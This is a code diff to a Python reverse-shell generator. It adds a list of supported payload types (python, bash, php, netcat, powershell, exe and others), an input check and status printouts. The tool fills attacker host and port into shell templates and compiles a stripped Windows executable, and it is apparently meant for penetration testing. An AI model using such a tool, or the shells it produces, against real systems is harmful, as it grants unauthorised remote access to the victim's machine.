@@ -29,9 +29,17 @@ if os.path.isdir('Store_shell') :
 else:   
     os.mkdir('Store_shell')     
 print (banner)
+path = ('file://'+os.getcwd()+'/'+'Store_shell')
+list_input = ['python','bash','perl','php','ruby','netcat','xterm','java','powershell','js','exe'] 
+if '--info' in sys.argv :
+   print('[*] Getshell Support : '+'\n'+'='*22)
+   for i in list_input :
+       print('[*] Support type is : ',i) 
+   exit()    
 class Reverse_Shell_Generator:
         def __init__(self):
             self.control()
+            self.Check_Inpiut()
             self.Selcet()
         def Selcet(self):
             if "python" in self.args.type and not self.args.onefile :
@@ -105,7 +113,6 @@ class Reverse_Shell_Generator:
                   windows = """$shell = 'uname -a; w; id; cmd -i';"""
                   with open ('./resources/pentestmonkey.txt' ,'r') as Monkey:
                              read_php = Monkey.readlines()
-      
                   for line in read_php:
                       if self.args.windows: 
                          line = line.replace("$ip = 'LHOST';",LHOST)
@@ -115,7 +122,12 @@ class Reverse_Shell_Generator:
                          line = line.replace("$ip = 'LHOST';",LHOST)
                          line = line.replace("$port = LPORT;",LPORT)     
                       with open('./Store_shell/PHP.php','a') as PHP_shell :
-                           write_shell = PHP_shell.write(line)   
+                           write_shell = PHP_shell.write(line)  
+                  print('[*] TYPE      : '+self.args.type +'\n' +'[*] LHOST     : ' +self.args.LHOST+'\n'\
+                  +'[*] LPORT     : ' +self.args.LPORT+'\n'+'='*30 +'\n') 
+                  print('[*] Generated  : Done !!')
+                  print('[*] File Name  : PHP.php ')
+                  print('[+] File Path  : ' +path+'/')           
             elif 'js' in self.args.type and len(self.args.type)==2:
                   if os.path.exists('./Store_shell/javascript.js'):
                      os.remove("./Store_shell/javascript.js")
@@ -138,7 +150,12 @@ class Reverse_Shell_Generator:
                            line = line.replace(Orgenal_Host,LHOST)
                            line = line.replace(Oragenal_port,LPORT)  
                       with open('./Store_shell/javascript.js','a') as PHP_shell :
-                           write_shell = PHP_shell.write(line)    
+                           write_shell = PHP_shell.write(line) 
+                  print('[*] TYPE      : '+self.args.type +'\n' +'[*] LHOST     : ' +self.args.LHOST+'\n'\
+                  +'[*] LPORT     : ' +self.args.LPORT+'\n'+'='*30 +'\n') 
+                  print('[*] Generated  : Done !!')
+                  print('[*] File Name  : javascript.js ')
+                  print('[+] File Path  : ' +path+'/')            
             elif 'exe' in self.args.type and len(self.args.type)==3:
                   if os.path.exists('./Store_shell/shell.c'):
                      os.remove("./Store_shell/shell.c")
@@ -159,6 +176,11 @@ class Reverse_Shell_Generator:
                      os.system("i686-w64-mingw32-g++ ./Store_shell/shell.c -o ./Store_shell/shell32.exe -lws2_32 -lwininet -s\
                                 -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc")                  
                   os.remove("./Store_shell/shell.c")
+                  print('[*] TYPE      : '+self.args.type +'\n' +'[*] LHOST     : ' +self.args.LHOST+'\n'\
+                  +'[*] LPORT     : ' +self.args.LPORT+'\n'+'='*30 +'\n') 
+                  print('[*] Generated  : Done !!')
+                  print('[*] File Name  : shell32.exe ')
+                  print('[+] File Path  : ' +path+'/')         
             
             elif 'python' in self.args.type and self.args.windows  and self.args.onefile :
                   if os.path.exists('./Store_shell/pyshellwindows.py'):
@@ -176,8 +198,12 @@ class Reverse_Shell_Generator:
                       line = line.replace(Oragenal_port,LPORT)  
                       with open('./Store_shell/pyshellwindows.py','a') as PY_shell :
                            write_shell = PY_shell.write(line)
+                  print('[*] TYPE      : '+self.args.type +'\n' +'[*] LHOST     : ' +self.args.LHOST+'\n'\
+                  +'[*] LPORT     : ' +self.args.LPORT+'\n'+'='*30 +'\n') 
+                  print('[*] Generated  : Done !!')
+                  print('[*] File Name  : pyshellwindows.py')
+                  print('[+] File Path  : ' +path+'/')         
             elif 'python' in self.args.type and  not self.args.windows  and self.args.onefile :
-                  print("q")
                    
                   if os.path.exists("./Store_shell/pyshellLinux.txt"):
                      os.remove("./Store_shell/pyshellLinux.txt")
@@ -193,7 +219,12 @@ class Reverse_Shell_Generator:
                       line = line.replace(Orgenal_Host,LHOST)
                       line = line.replace(Oragenal_port,LPORT)  
                       with open('./Store_shell/pyshellLinux.py','a') as PY_shell :
-                           write_shell = PY_shell.write(line)                 
+                           write_shell = PY_shell.write(line) 
+                  print('[*] TYPE      : '+self.args.type +'\n' +'[*] LHOST     : ' +self.args.LHOST+'\n'\
+                  +'[*] LPORT     : ' +self.args.LPORT+'\n'+'='*30 +'\n') 
+                  print('[*] Generated  : Done !!')
+                  print('[*] File Name  : pyshellLinux.py')
+                  print('[+] File Path  : ' +path+'/')                       
                            
         def control(self):    
             parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]")      
@@ -205,6 +236,7 @@ class Reverse_Shell_Generator:
             parser.add_argument("-M","--pentestmonkey"   , action='store_true'                        ,help   ="genteate php pentestmonkey payload file ") 
             parser.add_argument("-W","--windows"         , action='store_true'                        ,help   ="gentate reverseshell  for windows operating system ")
             parser.add_argument("-C32","--compile32"     , action='store_true'                        ,help   ="compile C code to exe executable 32 bit ")
+            parser.add_argument("--info"                 , action='store_true'                        ,help   ="print all support type of  the rverseshell ")
             parser.add_argument("-F","--onefile"         , action='store_true'                        ,help   ="genetate python script revelshell  ")
             parser.add_argument("-UD","--urlencode"      , action='store_true'                        ,help   ="encode url format ")
             self.args = parser.parse_args()         
@@ -245,7 +277,16 @@ class Reverse_Shell_Generator:
                  print(self.result)
             if self.args.output:
                 with open("./Store_shell/"+self.args.type+".txt",'w') as File_write :
-                     File_write.write(self.result)           
+                     File_write.write(self.result)   
+        def Check_Inpiut(self):                 
+            if self.args.type in list_input:
+               pass
+            
+            else:
+                print('[*] Getshell not support : ',self.args.type +'\n'+'='*30)  
+                for i in list_input :
+                    print('[*] Support type is : ',i)       
+                exit()               
 if __name__=='__main__':
    Reverse_Shell_Generator()  
 
